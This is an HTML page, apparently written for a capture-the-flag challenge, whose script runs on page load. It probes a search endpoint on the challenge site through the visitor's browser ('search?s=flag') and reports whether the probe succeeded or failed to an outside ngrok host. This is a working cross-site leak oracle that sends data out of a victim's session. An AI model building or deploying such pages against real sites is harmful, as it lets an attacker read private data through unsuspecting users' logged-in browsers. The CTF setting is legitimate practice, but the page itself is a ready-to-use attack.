<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Status Check</title>
</head>
<body>
    <h1>Verifica della Flag</h1>

    <script>
        const checkFlagStatus = () => {
            const img = new Image();
            img.src = 'https://matrix.capturetheflags.site/search?s=flag'; // Endpoint target

            img.onload = () => {
                console.log("Flag accessibile (200).");
                // Invia una notifica di "200 OK" al tuo server
                const success = new Image();
                success.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=200';
            };

            img.onerror = () => {
                console.log("Flag non accessibile (404).");
                // Invia una notifica di "404 Not Found" al tuo server
                const failure = new Image();
                failure.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=404';
            };
        };

        // Eseguire la funzione al caricamento della pagina
        window.onload = checkFlagStatus;
    </script>
</body>
</html>
